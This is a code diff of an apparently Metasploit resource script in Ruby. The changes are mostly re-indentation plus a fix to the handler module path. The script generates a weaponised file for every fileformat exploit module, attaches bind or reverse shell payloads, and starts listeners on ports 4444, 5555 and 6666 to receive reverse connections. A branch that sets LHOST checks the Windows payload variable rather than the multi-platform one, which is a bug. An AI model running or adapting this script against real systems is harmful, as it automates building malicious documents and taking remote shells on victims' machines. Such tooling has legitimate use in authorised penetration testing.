@@ -1,42 +1,42 @@
 <ruby>
 if (framework.datastore['WIN_PAYL'] != nil)
-	winpayl = framework.datastore['WIN_PAYL']
+    winpayl = framework.datastore['WIN_PAYL']
 else
-	# no payload defined -> we use a messagebox payload :)
-	winpayl = "windows/messagebox"
+    # no payload defined -> we use a messagebox payload :)
+    winpayl = "windows/messagebox"
 end
 
 if (framework.datastore['OSX_PAYL'] != nil)
-	osxpayl = framework.datastore['OSX_PAYL']
+    osxpayl = framework.datastore['OSX_PAYL']
 else
-	# no payload defined -> we use a generic bind payload :)
-	osxpayl = "generic/shell_bind_tcp"
+    # no payload defined -> we use a generic bind payload :)
+    osxpayl = "generic/shell_bind_tcp"
 end
 
 if (framework.datastore['MULTI_PAYL'] != nil)
-	multipayl = framework.datastore['MULTI_PAYL']
+    multipayl = framework.datastore['MULTI_PAYL']
 else
-	# no payload defined -> we use a generic bind payload :)
-	multipayl = "generic/shell_bind_tcp"
+    # no payload defined -> we use a generic bind payload :)
+    multipayl = "generic/shell_bind_tcp"
 end
 
 if (framework.datastore['LHOST'] == nil and (winpayl =~ /reverse/ or osxpayl =~ /reverse/ or multipayl =~ /reverse/))
-	print_error("please define a global LHOST Variable")
-	return
+    print_error("please define a global LHOST Variable")
+    return
 else
-	localIP = framework.datastore['LHOST']
+    localIP = framework.datastore['LHOST']
 end
 
 if (framework.datastore['VERBOSE'] == "true")
-	verbose = 1 #true
+    verbose = 1 #true
 else
-	verbose = 0
+    verbose = 0
 end
 
 if (framework.datastore['HANDLERS'] == "true")
-	handlers = 1 #true
+    handlers = 1 #true
 else
-	handlers = 0
+    handlers = 0
 end
 
 windows = false
@@ -44,66 +44,66 @@ multi = false
 osx = false
 
 framework.exploits.each do |exploit,mod|
-	if(exploit.to_s =~ /fileformat/)
-		print_line("generating fileformat exploit: #{exploit.to_s}")
-		run_single("use #{exploit}")
-		if(exploit.to_s =~ /windows/)
-			#we need this info for starting the handlers
-			windows = true
-			#setting the payload
-			run_single("set PAYLOAD #{winpayl}")
-			if(winpayl =~ /reverse/)
-				run_single("set LHOST #{localIP}")
-				run_single("set LPORT 4444")
-			end
-		elsif(exploit.to_s =~ /multi/)
-			#we need this info for starting the handlers
-			multi = true
-			#setting the payload
-			run_single("set PAYLOAD #{multipayl}")
-			if(winpayl =~ /reverse/)
-				run_single("set LHOST #{localIP}")
-				run_single("set LPORT 5555")
-			end
-		elsif(exploit.to_s =~ /osx/)
-			#we need this info for starting the handlers
-			osx = true
-			#setting the payload
-			run_single("set PAYLOAD #{osxpayl}")
-			if(osxpayl =~ /reverse/)
-				run_single("set LHOST #{localIP}")
-				run_single("set LPORT 6666")
-			end
-		end
-		extension = active_module.datastore['FILENAME'].split('.').last
-		filename = exploit.split('/').last
-		run_single("set FILENAME #{filename}.#{extension}")
-		run_single("exploit")
-		print_line
-	end
+    if(exploit.to_s =~ /fileformat/)
+        print_line("generating fileformat exploit: #{exploit.to_s}")
+        run_single("use #{exploit}")
+        if(exploit.to_s =~ /windows/)
+            #we need this info for starting the handlers
+            windows = true
+            #setting the payload
+            run_single("set PAYLOAD #{winpayl}")
+            if(winpayl =~ /reverse/)
+                run_single("set LHOST #{localIP}")
+                run_single("set LPORT 4444")
+            end
+        elsif(exploit.to_s =~ /multi/)
+            #we need this info for starting the handlers
+            multi = true
+            #setting the payload
+            run_single("set PAYLOAD #{multipayl}")
+            if(winpayl =~ /reverse/)
+                run_single("set LHOST #{localIP}")
+                run_single("set LPORT 5555")
+            end
+        elsif(exploit.to_s =~ /osx/)
+            #we need this info for starting the handlers
+            osx = true
+            #setting the payload
+            run_single("set PAYLOAD #{osxpayl}")
+            if(osxpayl =~ /reverse/)
+                run_single("set LHOST #{localIP}")
+                run_single("set LPORT 6666")
+            end
+        end
+        extension = active_module.datastore['FILENAME'].split('.').last
+        filename = exploit.split('/').last
+        run_single("set FILENAME #{filename}.#{extension}")
+        run_single("exploit")
+        print_line
+    end
 end
 
 if(handlers == 1)
-	#starting some handlers for reverse connections
-	run_single("use multi/handler")
-	if(windows == true and winpayl =~ /reverse/)
-		run_single("set PAYLOAD #{winpayl}")
-		run_single("set LHOST #{localIP}")
-		run_single("set LPORT 4444")
-		run_single("exploit -j")
-	end
-	if(multi == true and multipayl =~ /reverse/)
-		run_single("set PAYLOAD #{multipayl}")
-		run_single("set LHOST #{localIP}")
-		run_single("set LPORT 5555")
-		run_single("exploit -j")
-	end
-	if(osx == true and osxpayl =~ /reverse/)
-		run_single("set PAYLOAD #{osxpayl}")
-		run_single("set LHOST #{localIP}")
-		run_single("set LPORT 6666")
-		run_single("exploit -j")
-	end
+    #starting some handlers for reverse connections
+    run_single("use exploit/multi/handler")
+    if(windows == true and winpayl =~ /reverse/)
+        run_single("set PAYLOAD #{winpayl}")
+        run_single("set LHOST #{localIP}")
+        run_single("set LPORT 4444")
+        run_single("exploit -j")
+    end
+    if(multi == true and multipayl =~ /reverse/)
+        run_single("set PAYLOAD #{multipayl}")
+        run_single("set LHOST #{localIP}")
+        run_single("set LPORT 5555")
+        run_single("exploit -j")
+    end
+    if(osx == true and osxpayl =~ /reverse/)
+        run_single("set PAYLOAD #{osxpayl}")
+        run_single("set LHOST #{localIP}")
+        run_single("set LPORT 6666")
+        run_single("exploit -j")
+    end
 end
 run_single("back")
 </ruby>
